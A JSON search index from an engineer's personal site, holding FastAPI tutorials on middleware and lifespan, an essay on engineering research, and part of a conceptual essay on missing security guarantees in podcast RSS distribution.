{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to My Personal Hub","text":"<p>This is the central site where I share blogs, videos, podcasts, and resources.</p> <p>Check out:</p> <ul> <li>About-me</li> <li>Blog</li> <li>Videos</li> <li>Podcast</li> </ul>"},{"location":"about/","title":"About Me","text":"<p>Hi! I\u2019m Kfir Gisman, a software engineer and security researcher with a passion for solving complex problems. I specialize in building scalable microservices, cloud security solutions and more. My work spans startups and large enterprises, where I turn high-level requirements into robust, maintainable software.</p> <p>I also write technical articles on Medium and Dev.to, contribute to open-source projects, and enjoy sharing knowledge with the developer community. My approach blends creativity, engineering rigor, and a focus on practical results.</p>"},{"location":"about/#social","title":"Social","text":""},{"location":"about/#core-skills","title":"Core Skills","text":""},{"location":"about/#backend","title":"Backend","text":"<p>Python  FastAPI </p>"},{"location":"about/#cloud-infra","title":"Cloud &amp; Infra","text":"<p>Nginx  AWS  Docker  Kubernetes  Terraform </p>"},{"location":"about/#security-auth","title":"Security &amp; Auth","text":"<p>Keycloak  Vault  JWT </p>"},{"location":"about/#databases","title":"Databases","text":"<p>PostgreSQL  Redis  RabbitMQ </p>"},{"location":"about/#courses","title":"Courses","text":"<ul> <li>Kubernetes: Kubernetes for the Absolute Beginners - Hands-on</li> <li>NGINX: Introduction to NGINX</li> <li>Database Engineering: Fundamentals of Database Engineering - Udemy course</li> <li>Advanced Python: Parallel Programming and Memory Management</li> <li>Docker &amp; K8S: Docker Mastery</li> <li>Node.js: The Complete Node.js Developer Course</li> </ul>"},{"location":"about/#supporting-open-source-and-community-engagement","title":"Supporting Open Source and Community Engagement","text":"<ul> <li> <p>Recognized as a Top 8 FastAPI Expert for 2025 by FastAPI.</p> </li> <li> <p>Actively contribute to the FastAPI community by answering questions and assisting in the FastAPI organization.</p> </li> <li> <p>Github open source projects sponsoring</p> </li> <li> <p>Motivating the average developer to engage in DevSecOps - Lecture- Presentation at the DevSecOps Spain Community on Docker Security. I offered a hands-on experience for the audience, during which we coded together and investigated vulnerabilities in containers.</p> </li> <li> <p>PyPI Suspends New Registrations After Malicious Python Script Attack- Published in Checkpoint. Supply chain attacks targeting PyPi packages, exemplified by a recent incident involving 44 malicious packages uploaded, underscore the importance of verifying Python code sources to prevent system compromise and data exposure, emphasizing the need for robust security measures like CloudGuard Spectral to safeguard against such threats. </p> </li> </ul>"},{"location":"blog/","title":"Blogs","text":"<p>  You can subscribe to my Blogs using this RSS link: https://kfir-g.dev/blog/rss.xml</p>"},{"location":"blog/#blog-series","title":"Blog Series","text":""},{"location":"blog/#new","title":"New","text":"<p>The Robust HTTP Client - Beyond simple requests.get</p> <p>Redis Internals &amp; Data Structures - The In-Memory Backbone</p> <p>The Complete Guide to Protocol Buffers in FastAPI</p> <p>How Uvicorn Listens on an Open Port</p> <p>Event-Driven Architecture vs Request/Response: Designing Reactive Backends</p> <p>The Ultimate Celery Internals Guid- Serialization, Workers, Brokers, and Distributed Tasks</p> <p>AMQP Explained for Backend Engineers</p> <p>Async Tasks in Python- Why FastAPI Isn\u2019t Enough and When You Need Celery</p> <p>Appendix - Feed Identity vs Content Integrity</p> <p>Podcasts as a Supply Chain: A Missing Security Model</p> <p>How Software Engineers Should Do Good Research: The D in R&amp;D</p>"},{"location":"blog/#dives-into-asgi-series-articles","title":"Dives into ASGI Series\u2019 Articles","text":"<ol> <li> <p>Do You Really Know About FastAPI and ASGI? </p> </li> <li> <p>From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 1: ASGI </p> </li> <li> <p>From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 2: Your First Raw ASGI App </p> </li> <li> <p>From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 3: Middleware and Background Tasks</p> </li> <li> <p>From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 4: Lifespan, Startup, Shutdown, and State</p> </li> </ol>"},{"location":"blog/#memory-topics","title":"Memory Topics","text":"<ol> <li> <p>Understanding Python Memory and Garbage Collection Through Hands-On Experiments </p> </li> <li> <p>The Three Generations in Python\u2019s Garbage Collector </p> </li> <li> <p>Memory Allocation in Python: Understanding Arenas, Pools, and Blocks </p> </li> </ol>"},{"location":"blog/#quick-dives-into-fastapi-series-articles","title":"Quick Dives into FastAPI Series\u2019 Articles","text":"<ol> <li> <p>Unleash the Power of FastAPI: Async vs Blocking I/O </p> </li> <li> <p>Understanding FastAPI\u2019s UploadFile: The Starlette Connection </p> </li> <li> <p>Building Robust Components with FastAPI and Pydantic </p> </li> <li> <p>Understanding FastAPI Fundamentals: FastAPI, Uvicorn, Starlette, Swagger UI, and Pydantic </p> </li> <li> <p>Why You Should Use a Single FastAPI App and TestClient Instance </p> </li> </ol>"},{"location":"blog/#enhance-your-code-delivery-skills-as-a-software-engineer-series-articles","title":"Enhance Your Code Delivery Skills as a Software Engineer Series\u2019 Articles","text":"<ol> <li> <p>Solving Logs Woes: A Small Dive into Singleton Design Pattern </p> </li> <li> <p>Enhancing Software Architecture through Comprehensive Testing in Backend Development </p> </li> <li> <p>How to Write an Effective README File \u2014 A Guide for Software Engineers </p> </li> <li> <p>Mastering Error Handling: A Comprehensive Guide </p> </li> <li> <p>Raising the Difference Between Raise and Raise e </p> </li> </ol>"},{"location":"blog/#security-topics","title":"Security Topics","text":"<ul> <li> <p>Shell injection in GitHub Actions CI/CD </p> </li> <li> <p>Why IMDSv1 is a Security Risk for Cloud Infrastructure </p> </li> <li> <p>Why You Should Disable Cloud Storage Bucket Versioning </p> </li> </ul>"},{"location":"blog/#others","title":"Others","text":"<ul> <li> <p>This Small Python Script Improved Understanding of Low-Level Programming   Explores how a simple Python script bridges the gap between high-level programming and low-level concepts.</p> </li> <li> <p>7 Quick Tips to Get Started with HashiCorp Vault   Practical beginner-friendly guide to mastering HashiCorp Vault and securely managing secrets.</p> </li> </ul> <p>I regularly publish in some of Medium\u2019s top engineering publications, reaching a global audience of hundreds of thousands of developers every month. My work appears in:</p> <ul> <li>Level Up Coding \u2014 One of the most-read dev publications, home to tutorials, engineering deep-dives, and practical coding guides.</li> <li>Python in Plain English \u2014 New Python content daily, read by over 3.5M+ monthly readers.</li> <li>Stackademic \u2014 A major learning hub focused on democratizing high-quality programming education.</li> <li>CodeToDeploy \u2014 A unique publication blending technical insights with real-world engineering job opportunities.</li> </ul> <p>My articles consistently attract strong engagement \u2014 thousands of reads, likes, and shares - thanks to a focus on clear, hands-on engineering content that developers can apply immediately.</p>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/","title":"From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 3: Middleware and Background Tasks","text":"<p>Exploring ASGI middleware, background tasks, and advanced request/response patterns in FastAPI.</p>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#asgi-middleware-in-fastapi","title":"ASGI Middleware in FastAPI","text":"<p>Middleware is a layer that sits between the server and your application. In ASGI, middleware is an async callable that can intercept requests and responses:</p> <pre><code>from starlette.middleware.base import BaseHTTPMiddleware\nfrom fastapi import FastAPI, Request\n\napp = FastAPI()\n\nclass SimpleMiddleware(BaseHTTPMiddleware):\n    async def dispatch(self, request: Request, call_next):\n        print(f\"Request URL: {request.url}\")\n        response = await call_next(request)\n        response.headers['X-Custom-Header'] = 'Hello from Middleware'\n        return response\n\napp.add_middleware(SimpleMiddleware)\n</code></pre> <p>Middleware can be used for:</p> <ul> <li>Logging requests and responses</li> <li>Adding custom headers</li> <li>Handling authentication and authorization</li> <li>Measuring performance or request duration</li> </ul>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#background-tasks","title":"Background Tasks","text":"<p>FastAPI supports running tasks after sending the response, which is essential for operations that don\u2019t need to block the request:</p> <pre><code>from fastapi import FastAPI, BackgroundTasks\n\napp = FastAPI()\n\ndef write_log(message: str):\n    with open(\"log.txt\", \"a\") as f:\n        f.write(f\"{message}\\n\")\n\n@app.post(\"/send-data/\")\nasync def send_data(data: dict, background_tasks: BackgroundTasks):\n    background_tasks.add_task(write_log, f\"Received: {data}\")\n    return {\"message\": \"Data received. Logging in background.\"}\n</code></pre> <p>Benefits:</p> <ul> <li>Improves response time for users</li> <li>Allows long-running tasks to run asynchronously</li> <li>Integrates cleanly with async applications</li> </ul>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#request-and-response-lifecycle","title":"Request and Response Lifecycle","text":"<p>Understanding the request/response lifecycle is key for advanced FastAPI applications:</p> <pre><code>Client \u2192 ASGI Server \u2192 Middleware \u2192 Path Operation \u2192 Response \u2192 Middleware \u2192 ASGI Server \u2192 Client\n</code></pre> <ul> <li>Request passes through middleware first</li> <li>Path operation executes next</li> <li>Response goes back through middleware before returning to client</li> </ul> <p>Middleware can mutate request or response, while background tasks run after the response is sent.</p>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#combining-middleware-and-background-tasks","title":"Combining Middleware and Background Tasks","text":"<p>You can combine these features for advanced use cases:</p> <ul> <li>Logging requests and saving metrics in background</li> <li>Authenticating users and sending notifications asynchronously</li> <li>Transforming requests and caching responses</li> </ul> <pre><code>@app.post(\"/upload/\")\nasync def upload_file(file: bytes, background_tasks: BackgroundTasks):\n    background_tasks.add_task(process_file, file)\n    return {\"status\": \"File received, processing in background\"}\n</code></pre> <p>This pattern is essential for high-performance, real-world FastAPI apps.</p>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#best-practices","title":"Best Practices","text":"<ol> <li>Keep middleware lightweight \u2013 avoid blocking operations.</li> <li>Use background tasks for I/O-heavy operations.</li> <li>Leverage ASGI features for streaming and WebSocket scenarios.</li> <li>Monitor performance \u2013 middleware can introduce latency if overused.</li> </ol>"},{"location":"blog/blogs/2025-12-20_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-3/#references","title":"References","text":"<ul> <li>FastAPI Middleware Documentation</li> <li>Starlette ASGI Middleware</li> <li>Background Tasks in FastAPI</li> </ul> <p>Canonical link</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/","title":"From Passive FastAPI Developer to Real FastAPI Engineer \u2013 Part 4: Lifespan, Startup, Shutdown, and State","text":"<p>If you truly want to think in ASGI, you must understand what happens outside request handling.</p> <p>Requests are only one part of the application lifecycle. In this part, we\u2019ll dive into ASGI lifespan events, application startup/shutdown, and how state is managed correctly in FastAPI.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#the-asgi-lifespan-protocol","title":"The ASGI Lifespan Protocol","text":"<p>ASGI defines a lifespan scope that is separate from HTTP and WebSocket scopes.</p> <p>At a protocol level, the server sends events like:</p> <pre><code>lifespan.startup\nlifespan.shutdown\n</code></pre> <p>Your application must respond with:</p> <pre><code>lifespan.startup.complete\nlifespan.shutdown.complete\n</code></pre> <p>This is how the server knows when your app is ready to accept traffic or safe to terminate.</p> <p>FastAPI (via Starlette) abstracts this-but understanding it matters.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#startup-and-shutdown-in-fastapi-the-old-way","title":"Startup and Shutdown in FastAPI (The Old Way)","text":"<p>You may already know this pattern:</p> <pre><code>from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    print(\"App is starting\")\n\n@app.on_event(\"shutdown\")\nasync def shutdown_event():\n    print(\"App is shutting down\")\n</code></pre> <p>This works, but it has limitations:</p> <ul> <li>Harder to test</li> <li>Less explicit lifecycle control</li> <li>Being gradually replaced by the lifespan context manager</li> </ul>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#the-modern-way-lifespan-context-manager","title":"The Modern Way: Lifespan Context Manager","text":"<p>FastAPI now recommends using an async context manager:</p> <pre><code>from fastapi import FastAPI\nfrom contextlib import asynccontextmanager\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    print(\"Startup logic here\")\n    yield\n    print(\"Shutdown logic here\")\n\napp = FastAPI(lifespan=lifespan)\n</code></pre> <p>Why this is better:</p> <ul> <li>Clear lifecycle boundaries</li> <li>One place for resource management</li> <li>Easier to reason about startup vs shutdown</li> <li>Aligns directly with ASGI lifespan semantics</li> </ul> <p>Think of it as:</p> <pre><code>enter \u2192 app runs \u2192 exit\n</code></pre>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#what-belongs-in-startup","title":"What Belongs in Startup?","text":"<p>Startup is for process-level resources, not request-level work.</p> <p>Good examples:</p> <ul> <li>Database connections</li> <li>Redis clients</li> <li>HTTP client pools</li> <li>Loading ML models</li> <li>Initializing caches</li> <li>Starting background consumers</li> </ul> <p>Bad examples:</p> <ul> <li>Per-user logic</li> <li>Request validation</li> <li>Anything depending on request data</li> </ul>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#application-state-appstate","title":"Application State (<code>app.state</code>)","text":"<p>FastAPI exposes a shared state object:</p> <pre><code>app.state.db = db_connection\napp.state.redis = redis_client\n</code></pre> <p>You can then access it inside requests:</p> <pre><code>from fastapi import Request\n\n@app.get(\"/items\")\nasync def get_items(request: Request):\n    db = request.app.state.db\n    return {\"status\": \"ok\"}\n</code></pre> <p>Important properties of <code>app.state</code>:</p> <ul> <li>Shared across all requests</li> <li>Lives for the entire app lifetime</li> <li>Not request-safe by default</li> <li>Must hold thread-safe / async-safe objects</li> </ul> <p>This is not global variables - it\u2019s explicit, controlled state.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#why-not-global-variables","title":"Why Not Global Variables?","text":"<p>Globals seem easy:</p> <pre><code>db = None\n</code></pre> <p>But they break down when:</p> <ul> <li>Running multiple workers</li> <li>Reloading with Uvicorn</li> <li>Testing with TestClient</li> <li>Sharing state across async tasks</li> </ul> <p><code>app.state</code> ties the resource lifecycle to the ASGI app, not the Python module.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#shutdown-cleaning-up-correctly","title":"Shutdown: Cleaning Up Correctly","text":"<p>Shutdown is where you release resources:</p> <pre><code>@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    app.state.client = await create_client()\n    yield\n    await app.state.client.aclose()\n</code></pre> <p>If you don\u2019t close:</p> <ul> <li>Connections leak</li> <li>File descriptors accumulate</li> <li>Containers fail graceful shutdown</li> <li>Kubernetes SIGTERM handling breaks</li> </ul> <p>This is where real production bugs often hide.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#how-this-fits-with-middleware-and-background-tasks","title":"How This Fits with Middleware and Background Tasks","text":"<p>Let\u2019s connect the dots:</p> Feature Runs When Purpose Lifespan App start/stop Manage global resources Middleware Every request Cross-cutting concerns Background tasks After response Deferred per-request work Path operation During request Business logic <p>Each layer has a clear responsibility.</p> <p>Mixing them leads to fragile systems.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#a-real-world-pattern","title":"A Real-World Pattern","text":"<pre><code>@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    app.state.http = httpx.AsyncClient()\n    yield\n    await app.state.http.aclose()\n\napp = FastAPI(lifespan=lifespan)\n</code></pre> <p>Used with:</p> <pre><code>@app.get(\"/external\")\nasync def call_external(request: Request):\n    client = request.app.state.http\n    r = await client.get(\"https://example.com\")\n    return {\"status\": r.status_code}\n</code></pre> <p>This avoids:</p> <ul> <li>Creating clients per request</li> <li>Global variables</li> <li>Resource leaks</li> </ul> <p>This is ASGI thinking.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#common-mistakes-to-avoid","title":"Common Mistakes to Avoid","text":"<ol> <li>\u274c Doing I/O inside middleware startup logic</li> <li>\u274c Storing request data in <code>app.state</code></li> <li>\u274c Forgetting to close connections on shutdown</li> <li>\u274c Using globals instead of lifespan-managed state</li> <li>\u274c Mixing background tasks with startup logic</li> </ol>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#mental-model-upgrade","title":"Mental Model Upgrade","text":"<p>Stop thinking:</p> <p>\u201cFastAPI runs my function when a request arrives\u201d</p> <p>Start thinking:</p> <p>\u201cI am writing an ASGI application with a defined lifecycle\u201d</p> <p>That shift is what separates framework users from engineers.</p> <p>Conclusion</p> <p>Using middleware and background tasks wisely keeps your FastAPI app fast and maintainable. Even small improvements here pay off in overall performance and clarity.</p>"},{"location":"blog/blogs/2025-12-25_From-Passive-FastAPI-Developer-to-Real-FastAPI-Engineer--Part-4/#references","title":"References","text":"<ul> <li>https://asgi.readthedocs.io/en/latest/specs/lifespan.html</li> <li>https://fastapi.tiangolo.com/advanced/events/</li> <li>https://www.starlette.io/lifespan/</li> </ul> <p>Canonical link</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/","title":"How Software Engineers Should Do Good Research: The D in R&amp;D","text":"<p>Research is one of the least visible skills in software engineering-and one of the most important. We celebrate shipping and execution, but strong execution is usually the result of quiet, continuous research that no one notices.</p> <p>This post focuses on the D (Development) side of R&amp;D, and why good development depends on ongoing research, even when it feels like it\u2019s not paying off day by day.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#why-research-matters-in-an-swes-life","title":"Why Research Matters in an SWE\u2019s Life","text":"<p>Software engineering is not just about writing code. It\u2019s about making decisions under uncertainty.</p> <p>Good research helps you:</p> <ul> <li>Avoid cargo-cult engineering</li> <li>Understand why something works, not just how</li> <li>Choose tools intentionally instead of following trends</li> <li>Anticipate breaking changes, limitations, and risks</li> </ul> <p>Strong engineers don\u2019t know everything. They know how to reduce uncertainty faster than others.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#research-is-ongoing-and-often-feels-useless","title":"Research Is Ongoing (and Often Feels Useless)","text":"<p>One of the hardest truths about research is this:</p> <p>Daily research rarely feels productive.</p> <p>You read release notes that don\u2019t matter today. You skim docs for features you won\u2019t use yet. You follow discussions that don\u2019t immediately affect your code.</p> <p>And still-this is where long-term engineering clarity comes from.</p> <p>Research compounds quietly.  What feels irrelevant today becomes obvious context six months later.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#how-to-research-tools-effectively","title":"How to Research Tools Effectively","text":"<p>Before adopting a language, framework, or library, research beyond \u201cdoes it work\u201d.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#1-know-the-language","title":"1. Know the Language","text":"<ul> <li>Read official documentation (not just tutorials)</li> <li> <p>Understand the runtime model:</p> </li> <li> <p>Memory management</p> </li> <li>Concurrency</li> <li> <p>Async vs blocking</p> </li> <li> <p>Learn the language\u2019s philosophy</p> </li> </ul>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#2-know-the-framework","title":"2. Know the Framework","text":"<p>Ask questions like:</p> <ul> <li>Who maintains it?</li> <li>How opinionated is it?</li> <li>How fast does it change?</li> <li>Is it a thin abstraction or a heavy one?</li> <li>What problems was it actually designed to solve?</li> </ul>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#3-know-the-people-behind-it","title":"3. Know the People Behind It","text":"<ul> <li>Follow core maintainers</li> <li>Read design discussions and RFCs</li> <li>Watch conference talks from the creators</li> </ul> <p>This is where you learn intent, not just API usage.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#4-follow-the-ecosystem","title":"4. Follow the Ecosystem","text":"<ul> <li>Release notes</li> <li>GitHub issues and PRs</li> <li>Deprecations and breaking changes</li> <li>Security advisories</li> </ul> <p>Daily exposure here matters-even if you don\u2019t act on it immediately.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#how-to-research-the-product-or-company","title":"How to Research the Product or Company","text":"<p>Engineering decisions never exist in isolation.</p> <p>Research the product context:</p> <ul> <li>What problem does this product actually solve?</li> <li>What are the business constraints?</li> <li>Who are the users?</li> <li>What failure modes are acceptable?</li> </ul> <p>The \u201cbest\u201d technical solution in isolation can be the wrong one for the product.</p> <p>Good research aligns engineering decisions with business reality.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#how-to-research-a-topic-domain-level-research","title":"How to Research a Topic (Domain-Level Research)","text":"<p>Some topics require continuous awareness, not one-time learning.</p> <p>For example: security, infrastructure, cloud, networking.</p> <p>Good topic research includes:</p> <ul> <li>Reading industry news (not just blogs)</li> <li>Following vulnerability disclosures and advisories</li> <li>Attending meetups and conferences</li> <li>Talking to people actively working in the domain</li> </ul> <p>Cybersecurity is a good example: best practices expire faster than most documentation updates.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#the-learning-cycle-how-research-actually-works","title":"The Learning Cycle (How Research Actually Works)","text":"<p>Research is not linear. It\u2019s a loop:</p> <ol> <li>Learn the basics</li> <li>Build something</li> <li>Hit limitations</li> <li>Research deeper</li> <li>Refactor your understanding</li> <li>Repeat</li> </ol> <p>Each loop makes earlier concepts clearer.</p> <p>The best engineers revisit fundamentals-not because they forgot them, but because they now understand why they matter.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#practical-tips-that-actually-work","title":"Practical Tips That Actually Work","text":"<p>No hacks-just habits that scale:</p> <ul> <li>Use an RSS reader (blogs, release notes, security feeds)</li> <li>Follow official docs and changelogs, not just summaries</li> <li>Skim often, deep-read selectively</li> <li>Keep lightweight personal research notes</li> <li>Revisit old assumptions regularly</li> </ul> <p>Daily research won\u2019t feel rewarding. Monthly reflection will.</p>"},{"location":"blog/blogs/2025-12-27_how-swes-should-do-daily-research/#closing-thought","title":"Closing Thought","text":"<p>Great software engineers aren\u2019t defined by how fast they code, but by how well they research before and while coding.</p> <p>If you want long-term growth, treat research as a daily background process, not a one-time task. That\u2019s the real D in R&amp;D.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/","title":"Podcasts as a Supply Chain: A Missing Security Model","text":""},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#abstract","title":"Abstract","text":"<p>Podcasting is one of the largest automated content distribution systems on the internet. Millions of listeners download audio files every day via RSS feeds, implicitly trusting that the content they receive is authentic, unmodified, and intentionally published by its creator.</p> <p>This article argues that podcasting already functions as a global supply chain - yet lacks the security properties typically associated with such systems: provenance, integrity, immutability, and explicit trust guarantees. This is not an indictment of any specific platform, protocol, or organization. Rather, it is an exploration of a missing security model, aiming to model trust and security assumptions rather than disclose exploits.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#1-podcast-rss-is-not-just-content","title":"1. Podcast RSS Is Not \u201cJust Content\u201d","text":"<p>Podcast RSS is often framed as a simple publishing format, comparable to blogs or news feeds. This framing is misleading.</p> <p>In practice, a podcast episode is:</p> <ul> <li>A binary artifact (audio file)</li> <li>Automatically fetched by clients</li> <li>Cached, mirrored, and redistributed</li> <li>Consumed at scale by millions of endpoints</li> </ul> <p>RSS, in this context, is not merely a presentation layer - it is a distribution protocol. That distinction matters, because distribution protocols inevitably carry implicit security assumptions (RSS Spec), whether acknowledged or not.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#2-podcasts-already-behave-like-a-supply-chain","title":"2. Podcasts Already Behave Like a Supply Chain","text":"<p>Mapping podcasting to software delivery shows clear parallels:</p> Software Ecosystem Podcast Ecosystem Binary artifact Audio file Package registry Hosting platform Dependency manager Podcast application Update mechanism RSS polling / notifications End user Listener <p>Listeners do not manually inspect episodes before consuming them. They rely on automation, trust, and brand recognition - exactly like users of software packages.</p> <p>Podcasts today are also vastly more popular than in the past, with large shows producing dozens of episodes and multiple copies circulating across platforms, aggregators, and mirrors. The scale of distribution increases both the risk and impact of unauthenticated content.</p> <p>From a security perspective, this is the defining characteristic of a supply chain.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#3-the-implicit-trust-model-of-podcasting","title":"3. The Implicit Trust Model of Podcasting","text":"<p>The trust chain can be roughly described as:</p> <ul> <li>Listener trusts the podcast app  </li> <li>App trusts the RSS feed  </li> <li>RSS feed trusts the hosting platform  </li> <li>Platform trusts the creator account  </li> </ul> <p>Missing guarantees:</p> <ul> <li>Cryptographic authentication of episodes  </li> <li>Integrity guarantees for audio files  </li> <li>Immutability after publication  </li> <li>Provenance chain from creator to listener  </li> <li>Non-repudiation  </li> </ul> <p>Trust exists, but it is implicit, informal, and unenforced (Apple Podcasts RSS Requirements).</p> <p>Podcasts increasingly carry monetization and influence: programmatic ads, product endorsements, and subscription models are common, making integrity and provenance even more important.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#4-threat-modeling-podcast-rss","title":"4. Threat Modeling Podcast RSS","text":"<p>This discussion is about assumptions, not exploits.</p> <ul> <li>Assets: Listener trust, content authenticity, creator reputation  </li> <li>Threat Actors: Account takeover, malicious insiders, compromised hosting platforms, feed hijacking or misconfiguration  </li> <li>Attack Surface: RSS metadata, GUID handling, enclosure URLs, update and caching behavior in apps  </li> </ul> <p>None of these surfaces are inherently broken - they are simply unauthenticated.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#5-common-abuse-patterns-conceptual","title":"5. Common Abuse Patterns (Conceptual)","text":"<ul> <li>Metadata Poisoning: Metadata can change without explicit signals  </li> <li>Enclosure Replacement: Audio can be replaced while identifiers remain constant  </li> <li>Replay and Rollback: Older content can reappear under the same logical episode  </li> <li>GUID Collisions: Clients may overwrite or mishandle episodes unpredictably  </li> </ul> <p>These are consequences of design assumptions, not implementation bugs.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#6-what-major-hosting-platforms-validate-and-what-they-dont","title":"6. What Major Hosting Platforms Validate - and What They Don\u2019t","text":"<p>Platforms like Spotify for Creators, Podbean, RSS.com, and others validate operational aspects:</p> <ul> <li>Typically validated: XML correctness, required RSS fields, MIME types, file accessibility  </li> <li>Typically not validated: Cryptographic integrity, content provenance, immutability, intent verification  </li> </ul> <p>This aligns with treating podcasting as a CMS problem, not a supply-chain problem.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#7-podcast-index-and-podcasting-20-capabilities-not-guarantees","title":"7. Podcast Index and Podcasting 2.0: Capabilities, Not Guarantees","text":"<p>Podcast Index and Podcasting 2.0 provide:</p> <ul> <li>Decentralization  </li> <li>Extensibility  </li> <li>Creator empowerment  </li> <li>Real-time update signaling via Podping  </li> <li>Rich metadata through new RSS namespaces (Podcast Namespace)  </li> </ul> <p>These efforts preserve RSS\u2019s original philosophy: open, decentralized, permissionless, implicit trust. Security guarantees were not explicitly defined.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#8-podping-is-not-a-security-layer","title":"8. Podping Is Not a Security Layer","text":"<p>Podping improves update propagation speed but does not validate content:</p> <ul> <li>Signals feed changes  </li> <li>Reduces polling latency  </li> <li>Improves ecosystem efficiency  </li> </ul> <p>Does not:</p> <ul> <li>Authenticate content  </li> <li>Guarantee integrity  </li> <li>Prevent abuse  </li> <li>Establish provenance  </li> </ul> <p>Faster delivery of unauthenticated content may increase the importance of security modeling (Podping Protocol).</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#9-why-this-is-not-a-vulnerability","title":"9. Why This Is Not \u201cA Vulnerability\u201d","text":"<ul> <li>No single bug, CVE, or platform fault  </li> <li>It is a missing security model  </li> <li>Ecosystem assumes: \u201cIf it came from the feed, it must be legitimate\u201d  </li> <li>Reasonable for small-scale podcasting, less so today  </li> </ul> <p>The increasing popularity, influence, and monetization of podcasts amplifies potential harm if content integrity is not guaranteed.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#10-why-this-matters-now","title":"10. Why This Matters Now","text":"<p>Audio shapes opinions, builds trust, and influences decisions. At the same time:</p> <ul> <li>Voice cloning is trivial  </li> <li>Account compromise is common  </li> <li>Content changes are largely invisible  </li> <li>Large shows often distribute multiple copies across platforms  </li> </ul> <p>This combination makes podcasting an attractive, under-modeled supply chain, especially in the context of advertising, paid subscriptions, and political or financial influence.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#11-what-a-security-layer-could-look-like","title":"11. What a Security Layer Could Look Like","text":"<p>Optional, complementary layer ideas:</p> <ul> <li>Signed RSS feeds  </li> <li>Episode-level hashing  </li> <li>Immutability after publication  </li> <li>Transparency logs for feed changes  </li> <li>Client-side verification signals  </li> </ul> <p>Key principles: Opt-in, backward-compatible, non-centralized.</p>"},{"location":"blog/blogs/2025-12-30_podcasts-as-a-supply-chain-missing-security-model/#12-practical-takeaways","title":"12. Practical Takeaways","text":"<ul> <li>Creators: Immutable releases, visible change logs, transparency  </li> 